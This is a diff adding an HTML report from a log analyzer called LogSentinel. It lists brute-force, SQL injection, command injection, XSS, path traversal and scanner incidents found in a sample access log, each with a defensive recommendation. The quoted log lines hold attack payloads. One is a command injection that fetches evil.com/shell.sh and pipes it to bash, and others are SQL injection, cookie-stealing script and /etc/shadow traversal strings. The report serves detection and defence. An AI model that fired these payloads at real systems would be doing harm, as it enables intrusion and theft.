@@ -1,0 +1,254 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/>
+<title>LogSentinel Report</title>
+<style>
+  body{font-family:'Segoe UI',system-ui,sans-serif;background:#f3f4f6;margin:0;padding:2rem;color:#111827}
+  .wrap{max-width:1000px;margin:0 auto;background:#fff;border-radius:16px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,.08)}
+  .hd{background:linear-gradient(135deg,#0f172a,#1a2b4a);color:#fff;padding:2rem 2.5rem}
+  .meta{background:#f8fafc;padding:1.25rem 2.5rem;display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:1rem;border-bottom:1px solid #e5e7eb}
+  .mc{text-align:center}.ml{font-size:10px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;margin-bottom:3px}.mv{font-size:1.05rem;font-weight:700}
+  .sec{padding:1.5rem 2.5rem}.sec+.sec{border-top:1px solid #f1f5f9}
+  h2{font-size:14px;font-weight:700;color:#1e293b;text-transform:uppercase;letter-spacing:.5px;padding-bottom:6px;border-bottom:2px solid #e5e7eb;margin-bottom:1rem}
+  table{width:100%;border-collapse:collapse;font-size:13px}
+  th{background:#f1f5f9;padding:8px 12px;text-align:left;font-size:11px;text-transform:uppercase;color:#475569;font-weight:600}
+  tr:nth-child(even){background:#f8fafc}
+  footer{text-align:center;padding:1rem;font-size:12px;color:#9ca3af;border-top:1px solid #f1f5f9}
+</style></head><body>
+<div class="wrap">
+  <div class="hd">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:1rem">
+      <div style="width:42px;height:42px;background:#3b82f6;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:22px">🔍</div>
+      <div><div style="font-size:1.4rem;font-weight:800">LogSentinel</div>
+           <div style="font-size:11px;color:#94a3b8;letter-spacing:2px;text-transform:uppercase">Security Log Analyzer</div></div>
+    </div>
+    <div style="background:rgba(255,255,255,.08);border-radius:10px;padding:1rem 1.5rem;display:flex;align-items:center;gap:1.5rem;flex-wrap:wrap">
+      <div>
+        <div style="font-size:2.5rem;font-weight:900;color:#7c3aed;line-height:1">14</div>
+        <div style="font-size:11px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px">Incidents</div>
+      </div>
+      <div style="flex:1">
+        <div style="font-size:12px;color:#94a3b8">LOG FILE</div>
+        <div style="font-size:13px;color:#fff;font-family:monospace;margin-top:3px">sample_logs/access.log</div>
+        <div style="margin-top:10px"><span style="background:#7c3aed;color:#fff;padding:3px 12px;border-radius:5px;font-size:12px;font-weight:700;">OVERALL RISK: CRITICAL</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="meta">
+    <div class="mc"><div class="ml">Lines Parsed</div><div class="mv">996</div></div>
+    <div class="mc"><div class="ml">Web Entries</div><div class="mv">976</div></div>
+    <div class="mc"><div class="ml">SSH Entries</div><div class="mv">19</div></div>
+    <div class="mc"><div class="ml">Incidents</div><div class="mv" style="color:#7c3aed">14</div></div>
+    <div class="mc"><div class="ml">Unique IPs</div><div class="mv">13</div></div>
+    <div class="mc"><div class="ml">Scanned At</div><div class="mv" style="font-size:.8rem">2026-05-07 09:41:36</div></div>
+  </div>
+
+  <div class="sec">
+    <h2>Severity Summary</h2>
+    <div style="display:flex;gap:10px;flex-wrap:wrap"><div style="background:#fff;border:1px solid #e5e7eb;border-left:4px solid #7c3aed;border-radius:8px;padding:10px 16px;text-align:center;min-width:90px;"><div style="font-size:22px;font-weight:800;color:#7c3aed">4</div><div style="font-size:10px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;margin-top:3px">CRITICAL</div></div><div style="background:#fff;border:1px solid #e5e7eb;border-left:4px solid #dc2626;border-radius:8px;padding:10px 16px;text-align:center;min-width:90px;"><div style="font-size:22px;font-weight:800;color:#dc2626">8</div><div style="font-size:10px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;margin-top:3px">HIGH</div></div><div style="background:#fff;border:1px solid #e5e7eb;border-left:4px solid #ea580c;border-radius:8px;padding:10px 16px;text-align:center;min-width:90px;"><div style="font-size:22px;font-weight:800;color:#ea580c">2</div><div style="font-size:10px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;margin-top:3px">MEDIUM</div></div><div style="background:#fff;border:1px solid #e5e7eb;border-left:4px solid #ca8a04;border-radius:8px;padding:10px 16px;text-align:center;min-width:90px;"><div style="font-size:22px;font-weight:800;color:#ca8a04">0</div><div style="font-size:10px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;margin-top:3px">LOW</div></div></div>
+  </div>
+
+  <div class="sec">
+    <h2>Detected Incidents (14)</h2>
+    
+        <div style="border:1px solid #e5e7eb;border-left:4px solid #7c3aed;border-radius:10px;padding:1.25rem 1.5rem;margin-bottom:1rem;background:#fff;">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;margin-bottom:10px;">
+            <div>
+              <span style="font-size:12px;color:#6b7280;">#1 &nbsp;·&nbsp; SUCCESSFUL BRUTE FORCE</span>
+              <div style="font-size:14px;font-weight:600;color:#111827;margin-top:3px;">IP 185.220.101.45 made 18 failed SSH login attempts — then SUCCESSFULLY authenticated (1 time(s)). Possible account compromise.</div>
+            </div>
+            <div style="text-align:right;flex-shrink:0"><span style="background:#7c3aed;color:#fff;padding:2px 9px;border-radius:4px;font-size:11px;font-weight:700;">CRITICAL</span><div style="font-size:11px;color:#6b7280;margin-top:4px;">Count: 18</div></div>
+          </div>
+          <div style="margin-bottom:8px;"><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">May  1 09:15:00 webserver sshd[2000]: Failed password for ubuntu from 185.220.101.45 port 40000 ssh2</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">May  1 09:15:03 webserver sshd[2001]: Failed password for oracle from 185.220.101.45 port 40001 ssh2</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">May  1 09:15:06 webserver sshd[2002]: Failed password for root from 185.220.101.45 port 40002 ssh2</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">May  1 09:15:09 webserver sshd[2003]: Failed password for test from 185.220.101.45 port 40003 ssh2</div></div>
+          <div style="background:#eff6ff;border-radius:6px;padding:8px 12px;font-size:12px;color:#1d4ed8;">
+            <strong>→ Recommendation:</strong> Immediately revoke session, rotate credentials, audit what was accessed.
+          </div>
+          <div style="font-size:11px;color:#6b7280;margin-top:6px;">Source IP: <code>185.220.101.45</code></div>
+        </div>
+        <div style="border:1px solid #e5e7eb;border-left:4px solid #7c3aed;border-radius:10px;padding:1.25rem 1.5rem;margin-bottom:1rem;background:#fff;">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;margin-bottom:10px;">
+            <div>
+              <span style="font-size:12px;color:#6b7280;">#2 &nbsp;·&nbsp; SQL INJECTION</span>
+              <div style="font-size:14px;font-weight:600;color:#111827;margin-top:3px;">IP 45.33.32.156 sent 1 request(s) containing SQL injection payloads: admin'--.</div>
+            </div>
+            <div style="text-align:right;flex-shrink:0"><span style="background:#7c3aed;color:#fff;padding:2px 9px;border-radius:4px;font-size:11px;font-weight:700;">CRITICAL</span><div style="font-size:11px;color:#6b7280;margin-top:4px;">Count: 1</div></div>
+          </div>
+          <div style="margin-bottom:8px;"><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">45.33.32.156 - - [01/May/2026:09:21:09 +0000] "GET /login?user=admin'--&pass=x HTTP/1.1" 500 412 "-" "Mozilla/5.0 sqlmap</div></div>
+          <div style="background:#eff6ff;border-radius:6px;padding:8px 12px;font-size:12px;color:#1d4ed8;">
+            <strong>→ Recommendation:</strong> Use parameterized queries / prepared statements. Deploy a WAF. Block IP immediately. Audit database access logs.
+          </div>
+          <div style="font-size:11px;color:#6b7280;margin-top:6px;">Source IP: <code>45.33.32.156</code></div>
+        </div>
+        <div style="border:1px solid #e5e7eb;border-left:4px solid #7c3aed;border-radius:10px;padding:1.25rem 1.5rem;margin-bottom:1rem;background:#fff;">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;margin-bottom:10px;">
+            <div>
+              <span style="font-size:12px;color:#6b7280;">#3 &nbsp;·&nbsp; COMMAND INJECTION</span>
+              <div style="font-size:14px;font-weight:600;color:#111827;margin-top:3px;">CRITICAL: IP 91.108.4.22 attempted OS command injection (1 requests). Payloads: $(.</div>
+            </div>
+            <div style="text-align:right;flex-shrink:0"><span style="background:#7c3aed;color:#fff;padding:2px 9px;border-radius:4px;font-size:11px;font-weight:700;">CRITICAL</span><div style="font-size:11px;color:#6b7280;margin-top:4px;">Count: 1</div></div>
+          </div>
+          <div style="margin-bottom:8px;"><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">91.108.4.22 - - [01/May/2026:10:36:06 +0000] "GET /process?data=$(curl+http://evil.com/shell.sh+|+bash) HTTP/1.1" 200 10</div></div>
+          <div style="background:#eff6ff;border-radius:6px;padding:8px 12px;font-size:12px;color:#1d4ed8;">
+            <strong>→ Recommendation:</strong> URGENT: Audit server for compromise. Never pass user input to OS commands. Use subprocess with shell=False. Block IP immediately.
+          </div>
+          <div style="font-size:11px;color:#6b7280;margin-top:6px;">Source IP: <code>91.108.4.22</code></div>
+        </div>
+        <div style="border:1px solid #e5e7eb;border-left:4px solid #7c3aed;border-radius:10px;padding:1.25rem 1.5rem;margin-bottom:1rem;background:#fff;">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;margin-bottom:10px;">
+            <div>
+              <span style="font-size:12px;color:#6b7280;">#4 &nbsp;·&nbsp; DDOS PATTERN</span>
+              <div style="font-size:14px;font-weight:600;color:#111827;margin-top:3px;">IP 178.62.70.107 sent 600 requests — potential DDoS / volumetric attack.</div>
+            </div>
+            <div style="text-align:right;flex-shrink:0"><span style="background:#7c3aed;color:#fff;padding:2px 9px;border-radius:4px;font-size:11px;font-weight:700;">CRITICAL</span><div style="font-size:11px;color:#6b7280;margin-top:4px;">Count: 600</div></div>
+          </div>
+          <div style="margin-bottom:8px;"><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">178.62.70.107 - - [01/May/2026:11:11:58 +0000] "GET / HTTP/1.1" 200 1234 "-" "python-requests/2.1"</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">... (600 total requests)</div></div>
+          <div style="background:#eff6ff;border-radius:6px;padding:8px 12px;font-size:12px;color:#1d4ed8;">
+            <strong>→ Recommendation:</strong> Rate-limit at CDN/firewall level. Block 178.62.70.107. Enable DDoS protection (Cloudflare, AWS Shield). Analyze traffic pattern for botnet signatures.
+          </div>
+          <div style="font-size:11px;color:#6b7280;margin-top:6px;">Source IP: <code>178.62.70.107</code></div>
+        </div>
+        <div style="border:1px solid #e5e7eb;border-left:4px solid #dc2626;border-radius:10px;padding:1.25rem 1.5rem;margin-bottom:1rem;background:#fff;">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;margin-bottom:10px;">
+            <div>
+              <span style="font-size:12px;color:#6b7280;">#5 &nbsp;·&nbsp; XSS ATTEMPT</span>
+              <div style="font-size:14px;font-weight:600;color:#111827;margin-top:3px;">IP 103.45.67.89 injected XSS payloads (2 request(s)). Patterns: <script, </script>, javascript:.</div>
+            </div>
+            <div style="text-align:right;flex-shrink:0"><span style="background:#dc2626;color:#fff;padding:2px 9px;border-radius:4px;font-size:11px;font-weight:700;">HIGH</span><div style="font-size:11px;color:#6b7280;margin-top:4px;">Count: 2</div></div>
+          </div>
+          <div style="margin-bottom:8px;"><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">103.45.67.89 - - [01/May/2026:10:00:41 +0000] "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1" 200 892 "</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">103.45.67.89 - - [01/May/2026:09:42:33 +0000] "GET /input?data=javascript:eval(String.fromCharCode(97,108,101,114,116)) </div></div>
+          <div style="background:#eff6ff;border-radius:6px;padding:8px 12px;font-size:12px;color:#1d4ed8;">
+            <strong>→ Recommendation:</strong> Implement output encoding. Use Content-Security-Policy (CSP) headers. Sanitize all user inputs. Deploy WAF.
+          </div>
+          <div style="font-size:11px;color:#6b7280;margin-top:6px;">Source IP: <code>103.45.67.89</code></div>
+        </div>
+        <div style="border:1px solid #e5e7eb;border-left:4px solid #dc2626;border-radius:10px;padding:1.25rem 1.5rem;margin-bottom:1rem;background:#fff;">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;margin-bottom:10px;">
+            <div>
+              <span style="font-size:12px;color:#6b7280;">#6 &nbsp;·&nbsp; PATH TRAVERSAL</span>
+              <div style="font-size:14px;font-weight:600;color:#111827;margin-top:3px;">IP 192.241.208.18 attempted directory traversal (2 requests). Targeted: config.php, .env.</div>
+            </div>
+            <div style="text-align:right;flex-shrink:0"><span style="background:#dc2626;color:#fff;padding:2px 9px;border-radius:4px;font-size:11px;font-weight:700;">HIGH</span><div style="font-size:11px;color:#6b7280;margin-top:4px;">Count: 2</div></div>
+          </div>
+          <div style="margin-bottom:8px;"><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">192.241.208.18 - - [01/May/2026:09:20:52 +0000] "GET /.env HTTP/1.1" 404 312 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">192.241.208.18 - - [01/May/2026:09:14:52 +0000] "GET /config.php HTTP/1.1" 404 312 "-" "Mozilla/5.0 (compatible; Nikto/2</div></div>
+          <div style="background:#eff6ff;border-radius:6px;padding:8px 12px;font-size:12px;color:#1d4ed8;">
+            <strong>→ Recommendation:</strong> Validate and sanitize all file path inputs. Use chroot jails. Ensure web root is isolated. Audit file access logs.
+          </div>
+          <div style="font-size:11px;color:#6b7280;margin-top:6px;">Source IP: <code>192.241.208.18</code></div>
+        </div>
+        <div style="border:1px solid #e5e7eb;border-left:4px solid #dc2626;border-radius:10px;padding:1.25rem 1.5rem;margin-bottom:1rem;background:#fff;">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;margin-bottom:10px;">
+            <div>
+              <span style="font-size:12px;color:#6b7280;">#7 &nbsp;·&nbsp; PATH TRAVERSAL</span>
+              <div style="font-size:14px;font-weight:600;color:#111827;margin-top:3px;">IP 77.88.55.80 attempted directory traversal (5 requests). Targeted: ..%2f, wp-config.php, /etc/passwd.</div>
+            </div>
+            <div style="text-align:right;flex-shrink:0"><span style="background:#dc2626;color:#fff;padding:2px 9px;border-radius:4px;font-size:11px;font-weight:700;">HIGH</span><div style="font-size:11px;color:#6b7280;margin-top:4px;">Count: 5</div></div>
+          </div>
+          <div style="margin-bottom:8px;"><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">77.88.55.80 - - [01/May/2026:10:25:37 +0000] "GET /download?file=../../../etc/passwd HTTP/1.1" 403 211 "-" "python-reque</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">77.88.55.80 - - [01/May/2026:10:23:39 +0000] "GET /view?path=..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1" 403 211 "-" "python-r</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">77.88.55.80 - - [01/May/2026:09:59:27 +0000] "GET /load?doc=../../wp-config.php HTTP/1.1" 403 211 "-" "python-requests/2</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">77.88.55.80 - - [01/May/2026:10:06:26 +0000] "GET /file?name=....//....//etc/hosts HTTP/1.1" 403 211 "-" "python-request</div></div>
+          <div style="background:#eff6ff;border-radius:6px;padding:8px 12px;font-size:12px;color:#1d4ed8;">
+            <strong>→ Recommendation:</strong> Validate and sanitize all file path inputs. Use chroot jails. Ensure web root is isolated. Audit file access logs.
+          </div>
+          <div style="font-size:11px;color:#6b7280;margin-top:6px;">Source IP: <code>77.88.55.80</code></div>
+        </div>
+        <div style="border:1px solid #e5e7eb;border-left:4px solid #dc2626;border-radius:10px;padding:1.25rem 1.5rem;margin-bottom:1rem;background:#fff;">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;margin-bottom:10px;">
+            <div>
+              <span style="font-size:12px;color:#6b7280;">#8 &nbsp;·&nbsp; MALICIOUS SCANNER</span>
+              <div style="font-size:14px;font-weight:600;color:#111827;margin-top:3px;">IP 45.33.32.156 used known attack tool(s): sqlmap (8 requests). Active reconnaissance detected.</div>
+            </div>
+            <div style="text-align:right;flex-shrink:0"><span style="background:#dc2626;color:#fff;padding:2px 9px;border-radius:4px;font-size:11px;font-weight:700;">HIGH</span><div style="font-size:11px;color:#6b7280;margin-top:4px;">Count: 8</div></div>
+          </div>
+          <div style="margin-bottom:8px;"><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">45.33.32.156 - - [01/May/2026:09:21:09 +0000] "GET /login?user=admin'--&pass=x HTTP/1.1" 500 412 "-" "Mozilla/5.0 sqlmap</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">45.33.32.156 - - [01/May/2026:08:40:35 +0000] "GET /search?q=1' union select username,password from users-- HTTP/1.1" 50</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">45.33.32.156 - - [01/May/2026:08:59:31 +0000] "GET /product?id=1' or '1'='1 HTTP/1.1" 500 412 "-" "Mozilla/5.0 sqlmap/1.</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">45.33.32.156 - - [01/May/2026:08:44:10 +0000] "GET /api/user?id=1; drop table users-- HTTP/1.1" 500 412 "-" "Mozilla/5.0</div></div>
+          <div style="background:#eff6ff;border-radius:6px;padding:8px 12px;font-size:12px;color:#1d4ed8;">
+            <strong>→ Recommendation:</strong> Block IP 45.33.32.156 at firewall immediately. Review all requests from this IP. Check if any exploits succeeded (2xx responses).
+          </div>
+          <div style="font-size:11px;color:#6b7280;margin-top:6px;">Source IP: <code>45.33.32.156</code></div>
+        </div>
+        <div style="border:1px solid #e5e7eb;border-left:4px solid #dc2626;border-radius:10px;padding:1.25rem 1.5rem;margin-bottom:1rem;background:#fff;">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;margin-bottom:10px;">
+            <div>
+              <span style="font-size:12px;color:#6b7280;">#9 &nbsp;·&nbsp; MALICIOUS SCANNER</span>
+              <div style="font-size:14px;font-weight:600;color:#111827;margin-top:3px;">IP 192.241.208.18 used known attack tool(s): nikto (16 requests). Active reconnaissance detected.</div>
+            </div>
+            <div style="text-align:right;flex-shrink:0"><span style="background:#dc2626;color:#fff;padding:2px 9px;border-radius:4px;font-size:11px;font-weight:700;">HIGH</span><div style="font-size:11px;color:#6b7280;margin-top:4px;">Count: 16</div></div>
+          </div>
+          <div style="margin-bottom:8px;"><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">192.241.208.18 - - [01/May/2026:09:01:05 +0000] "GET /admin HTTP/1.1" 200 312 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">192.241.208.18 - - [01/May/2026:09:54:09 +0000] "GET /phpmyadmin HTTP/1.1" 404 312 "-" "Mozilla/5.0 (compatible; Nikto/2</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">192.241.208.18 - - [01/May/2026:09:12:02 +0000] "GET /wp-admin HTTP/1.1" 404 312 "-" "Mozilla/5.0 (compatible; Nikto/2.1</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">192.241.208.18 - - [01/May/2026:09:50:50 +0000] "GET /pma HTTP/1.1" 200 312 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"</div></div>
+          <div style="background:#eff6ff;border-radius:6px;padding:8px 12px;font-size:12px;color:#1d4ed8;">
+            <strong>→ Recommendation:</strong> Block IP 192.241.208.18 at firewall immediately. Review all requests from this IP. Check if any exploits succeeded (2xx responses).
+          </div>
+          <div style="font-size:11px;color:#6b7280;margin-top:6px;">Source IP: <code>192.241.208.18</code></div>
+        </div>
+        <div style="border:1px solid #e5e7eb;border-left:4px solid #dc2626;border-radius:10px;padding:1.25rem 1.5rem;margin-bottom:1rem;background:#fff;">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;margin-bottom:10px;">
+            <div>
+              <span style="font-size:12px;color:#6b7280;">#10 &nbsp;·&nbsp; MALICIOUS SCANNER</span>
+              <div style="font-size:14px;font-weight:600;color:#111827;margin-top:3px;">IP 103.45.67.89 used known attack tool(s): w3af (3 requests). Active reconnaissance detected.</div>
+            </div>
+            <div style="text-align:right;flex-shrink:0"><span style="background:#dc2626;color:#fff;padding:2px 9px;border-radius:4px;font-size:11px;font-weight:700;">HIGH</span><div style="font-size:11px;color:#6b7280;margin-top:4px;">Count: 3</div></div>
+          </div>
+          <div style="margin-bottom:8px;"><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">103.45.67.89 - - [01/May/2026:10:00:41 +0000] "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1" 200 892 "</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">103.45.67.89 - - [01/May/2026:09:55:34 +0000] "GET /comment?text=<img src=x onerror=alert(1)> HTTP/1.1" 200 892 "-" "Moz</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">103.45.67.89 - - [01/May/2026:09:42:33 +0000] "GET /input?data=javascript:eval(String.fromCharCode(97,108,101,114,116)) </div></div>
+          <div style="background:#eff6ff;border-radius:6px;padding:8px 12px;font-size:12px;color:#1d4ed8;">
+            <strong>→ Recommendation:</strong> Block IP 103.45.67.89 at firewall immediately. Review all requests from this IP. Check if any exploits succeeded (2xx responses).
+          </div>
+          <div style="font-size:11px;color:#6b7280;margin-top:6px;">Source IP: <code>103.45.67.89</code></div>
+        </div>
+        <div style="border:1px solid #e5e7eb;border-left:4px solid #dc2626;border-radius:10px;padding:1.25rem 1.5rem;margin-bottom:1rem;background:#fff;">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;margin-bottom:10px;">
+            <div>
+              <span style="font-size:12px;color:#6b7280;">#11 &nbsp;·&nbsp; MALICIOUS SCANNER</span>
+              <div style="font-size:14px;font-weight:600;color:#111827;margin-top:3px;">IP 198.54.117.200 used known attack tool(s): dirb, dirbuster (40 requests). Active reconnaissance detected.</div>
+            </div>
+            <div style="text-align:right;flex-shrink:0"><span style="background:#dc2626;color:#fff;padding:2px 9px;border-radius:4px;font-size:11px;font-weight:700;">HIGH</span><div style="font-size:11px;color:#6b7280;margin-top:4px;">Count: 40</div></div>
+          </div>
+          <div style="margin-bottom:8px;"><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">198.54.117.200 - - [01/May/2026:10:25:10 +0000] "GET /dir0 HTTP/1.1" 404 196 "-" "DirBuster-1.0-RC1"</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">198.54.117.200 - - [01/May/2026:10:25:05 +0000] "GET /dir1 HTTP/1.1" 404 196 "-" "DirBuster-1.0-RC1"</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">198.54.117.200 - - [01/May/2026:10:14:55 +0000] "GET /dir2 HTTP/1.1" 404 196 "-" "DirBuster-1.0-RC1"</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">198.54.117.200 - - [01/May/2026:10:43:30 +0000] "GET /dir3 HTTP/1.1" 404 196 "-" "DirBuster-1.0-RC1"</div></div>
+          <div style="background:#eff6ff;border-radius:6px;padding:8px 12px;font-size:12px;color:#1d4ed8;">
+            <strong>→ Recommendation:</strong> Block IP 198.54.117.200 at firewall immediately. Review all requests from this IP. Check if any exploits succeeded (2xx responses).
+          </div>
+          <div style="font-size:11px;color:#6b7280;margin-top:6px;">Source IP: <code>198.54.117.200</code></div>
+        </div>
+        <div style="border:1px solid #e5e7eb;border-left:4px solid #dc2626;border-radius:10px;padding:1.25rem 1.5rem;margin-bottom:1rem;background:#fff;">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;margin-bottom:10px;">
+            <div>
+              <span style="font-size:12px;color:#6b7280;">#12 &nbsp;·&nbsp; MALICIOUS SCANNER</span>
+              <div style="font-size:14px;font-weight:600;color:#111827;margin-top:3px;">IP 178.62.70.107 used known attack tool(s): python-requests/2.1 (600 requests). Active reconnaissance detected.</div>
+            </div>
+            <div style="text-align:right;flex-shrink:0"><span style="background:#dc2626;color:#fff;padding:2px 9px;border-radius:4px;font-size:11px;font-weight:700;">HIGH</span><div style="font-size:11px;color:#6b7280;margin-top:4px;">Count: 600</div></div>
+          </div>
+          <div style="margin-bottom:8px;"><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">178.62.70.107 - - [01/May/2026:11:11:58 +0000] "GET / HTTP/1.1" 200 1234 "-" "python-requests/2.1"</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">178.62.70.107 - - [01/May/2026:11:13:34 +0000] "GET / HTTP/1.1" 200 1234 "-" "python-requests/2.1"</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">178.62.70.107 - - [01/May/2026:11:38:52 +0000] "GET / HTTP/1.1" 200 1234 "-" "python-requests/2.1"</div><div style="background:#0f172a;color:#67e8f9;font-family:monospace;font-size:11px;padding:4px 8px;border-radius:4px;margin:2px 0;word-break:break-all;">178.62.70.107 - - [01/May/2026:11:32:56 +0000] "GET / HTTP/1.1" 200 1234 "-" "python-requests/2.1"</div></div>
+          <div style="background:#eff6ff;border-radius:6px;padding:8px 12px;font-size:12px;color:#1d4ed8;">
+            <strong>→ Recommendation:</strong> Block IP 178.62.70.107 at firewall immediately. Review all requests from this IP. Check if any exploits succeeded (2xx responses).
+          </div>
+          <div style="font-size:11px;color:#6b7280;margin-top:6px;">Source IP: <code>178.62.70.107</code></div>
+        </div>
+        <div style="border:1px solid #e5e7eb;border-left:4px solid #ea580c;border-radius:10px;padding:1.25rem 1.5rem;margin-bottom:1rem;background:#fff;">
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;margin-bottom:10px;">
+            <div>
+              <span style="font-size:12px;color:#6b7280;">#13 &nbsp;·&nbsp; 404 FLOOD</span>
+              <div style="font-size:14px;font-weight:600;color:#111827;margin-top:3px;">IP 198.54.117.200 triggered 40 HTTP 404 errors — directory/file enumeration detected.</div>
+            </div>
+            <div style="text-align:right;flex-shrink:0"><span style="background:#ea580c;color:#fff;padding:2px 9px;border-radius:4px;font-size:11px;font-weight:700;">MEDIUM</span><div style="font-size:11px;color:#6b7280;margin-top:4px;">Count: 40</div></div>
+          </div>
